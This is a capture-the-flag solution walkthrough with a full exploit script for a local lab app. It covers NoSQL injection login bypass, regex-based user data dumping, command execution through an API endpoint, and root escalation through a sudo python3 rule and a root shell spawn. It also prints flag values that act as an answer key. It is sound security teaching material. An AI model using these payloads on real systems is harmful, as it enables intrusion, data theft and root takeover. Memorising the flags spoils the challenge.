## Solution

<details>
<summary>Click to reveal solution</summary>

### Phase 1: FLAG 1 - Authentication Bypass

#### Step 1: Understand the Login Mechanism

Navigate to http://localhost:4007/login and examine the login form. Open browser DevTools and look at the network request when logging in.

The login expects JSON:
```json
{
  "username": "test",
  "password": "test123"
}
```

#### Step 2: Inject MongoDB Operator

Instead of providing a string password, inject a MongoDB operator to bypass authentication:

```bash
curl -X POST http://localhost:4007/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": {"$ne": null}
  }'
```

Or using Python:

```python
import requests

BASE_URL = "http://localhost:4007"

# Inject $ne (not equal) operator
payload = {
    "username": "admin",
    "password": {"$ne": None}  # Matches any password that exists
}

response = requests.post(f"{BASE_URL}/login", json=payload)
result = response.json()

if result.get('success'):
    print(f"🚩 FLAG 1: {result.get('flag')}")
```

The query becomes: `db.users.find_one({'username': 'admin', 'password': {'$ne': null}})` which finds the admin user regardless of password.

**Alternative payloads:**

```json
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$exists": true}}
{"username": {"$regex": "^admin$"}, "password": {"$ne": null}}
```

#### Step 3: Access Dashboard

After successful authentication bypass, you'll receive FLAG 1 in the response. You can also access the dashboard at http://localhost:4007/dashboard

### Phase 2: FLAG 2 - Data Extraction

#### Step 4: Login First

You need to be authenticated to access the search endpoint. Use the authentication bypass from Phase 1:

```python
import requests

BASE_URL = "http://localhost:4007"
session = requests.Session()

# Login as admin
payload = {
    "username": "admin",
    "password": {"$ne": None}
}

response = session.post(f"{BASE_URL}/login", json=payload)
print("[+] Logged in as admin")
```

#### Step 5: Enumerate All Users

The `/api/search` endpoint is vulnerable to NoSQL injection. Extract all users:

```bash
curl -X POST http://localhost:4007/api/search \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d '{
    "username": {"$regex": ".*"}
  }'
```

Or using Python:

```python
# Search with regex to match all users
search_payload = {
    "username": {"$regex": ".*"}
}

response = session.post(f"{BASE_URL}/api/search", json=search_payload)
result = response.json()

print(f"[+] Found {result['count']} users:")
for user in result['users']:
    print(f"  - {user['username']} ({user.get('role', 'N/A')})")
    if 'secret' in user:
        print(f"    SECRET: {user['secret']}")
        print(f"    🚩 FLAG 2: {user['secret']}")
```

The admin user document contains a `secret` field with FLAG 2!

#### Step 6: Alternative Extraction Methods

**Extract specific user:**
```json
{"username": {"$regex": "^admin$"}}
```

**Extract by role:**
```json
{"username": {"$gt": ""}, "role": "administrator"}
```

**Boolean-based blind extraction** (if output was limited):
```python
# Extract username character by character
for i in range(10):
    for char in 'abcdefghijklmnopqrstuvwxyz':
        payload = {
            "username": {"$regex": f"^{char}"}
        }
        response = session.post(f"{BASE_URL}/api/search", json=payload)
        if response.json()['count'] > 0:
            print(f"First char: {char}")
            break
```

### Phase 3: FLAG 3 - Remote Code Execution

Now that we're authenticated as admin, we can access the command execution endpoint.

#### Step 7: Discover Command Execution Endpoint

```bash
curl -X POST http://localhost:4007/api/execute \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d '{
    "command": "whoami"
  }'
```

#### Step 8: Read FLAG 3

```python
# Execute command to read FLAG 3
exec_payload = {
    "command": "cat /home/ctfuser/flag3.txt"
}

response = session.post(f"{BASE_URL}/api/execute", json=exec_payload)
result = response.json()

if result.get('success'):
    print(f"🚩 FLAG 3: {result['output'].strip()}")
```

**FLAG 3**: `DUNO{0da76b416aa73036772b8c2d08e51b7e}`

### Phase 4: FLAG 4 - Privilege Escalation to Root

#### Step 9: Check Sudo Privileges

```python
# Check what sudo commands are available
sudo_check = {
    "command": "sudo -l"
}

response = session.post(f"{BASE_URL}/api/execute", json=sudo_check)
print(response.json()['output'])
```

Output shows:
```
User ctfuser may run the following commands:
    (ALL) NOPASSWD: /usr/bin/python3
```

#### Step 10: Exploit Sudo via GTFOBins

Python3 is a known GTFOBin. We can use it to escalate to root:

**Note**: The sudoers rule points to `/usr/bin/python3`, which resolves via symlink to the actual Python binary. This works correctly — `sudo /usr/bin/python3` is the correct command to use.

```python
# Method 1: Direct command execution as root
privesc_payload = {
    "command": "sudo python3 -c 'import os; os.system(\"cat /root/flag4.txt\")'"
}

response = session.post(f"{BASE_URL}/api/execute", json=privesc_payload)
result = response.json()

if result.get('success'):
    print(f"🚩 FLAG 4: {result['output'].strip()}")
```

**Alternative methods**:

```bash
# Method 2: Spawn root shell then read flag
sudo python3 -c 'import pty; pty.spawn("/bin/sh")'
cat /root/flag4.txt

# Method 3: Use python to directly read file
sudo python3 -c 'print(open("/root/flag4.txt").read())'
```

**FLAG 4**: `DUNO{0247e88c68c3ae81dc8740e14362fa2b}`

### Complete Exploit Script (All 4 Flags)

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:4007"

print("=" * 60)
print("India - NoSQL Injection Complete Exploit")
print("=" * 60)

# Phase 1: Authentication Bypass
print("\n[Phase 1] Authentication Bypass")
print("-" * 60)

session = requests.Session()

auth_payload = {
    "username": "admin",
    "password": {"$ne": None}
}

response = session.post(f"{BASE_URL}/login", json=auth_payload)
result = response.json()

if result.get('success'):
    print("[+] Successfully bypassed authentication!")
    print(f"[+] Role: {result.get('role')}")
    if result.get('flag'):
        print(f"🚩 FLAG 1: {result['flag']}")

# Phase 2: Data Extraction
print("\n[Phase 2] Data Extraction")
print("-" * 60)

search_payload = {
    "username": {"$regex": ".*"}
}

response = session.post(f"{BASE_URL}/api/search", json=search_payload)
result = response.json()

print(f"[+] Extracted {result['count']} users:")

for user in result['users']:
    print(f"\n  Username: {user.get('username')}")
    print(f"  Email: {user.get('email')}")
    print(f"  Role: {user.get('role')}")
    print(f"  Department: {user.get('department')}")

    if 'secret' in user:
        print(f"  🎯 SECRET FOUND: {user['secret']}")
        print(f"  🚩 FLAG 2: {user['secret']}")

# Phase 3: Command Execution (RCE)
print("\n[Phase 3] Remote Code Execution")
print("-" * 60)

rce_payload = {
    "command": "cat /home/ctfuser/flag3.txt"
}

response = session.post(f"{BASE_URL}/api/execute", json=rce_payload)
result = response.json()

if result.get('success'):
    flag3 = result['output'].strip()
    print(f"[+] Executed command successfully")
    print(f"🚩 FLAG 3: {flag3}")

# Phase 4: Privilege Escalation
print("\n[Phase 4] Privilege Escalation to Root")
print("-" * 60)

# Check sudo privileges
sudo_check = {
    "command": "sudo -l"
}
response = session.post(f"{BASE_URL}/api/execute", json=sudo_check)
print(f"[+] Sudo privileges:\n{response.json()['output']}")

# Escalate to root and read flag
privesc_payload = {
    "command": "sudo python3 -c 'import os; os.system(\"cat /root/flag4.txt\")'"
}

response = session.post(f"{BASE_URL}/api/execute", json=privesc_payload)
result = response.json()

if result.get('success'):
    flag4 = result['output'].strip()
    print(f"[+] Privilege escalation successful")
    print(f"🚩 FLAG 4: {flag4}")

print("\n" + "=" * 60)
print("✓ All 4 flags captured!")
print("=" * 60)
```

</details>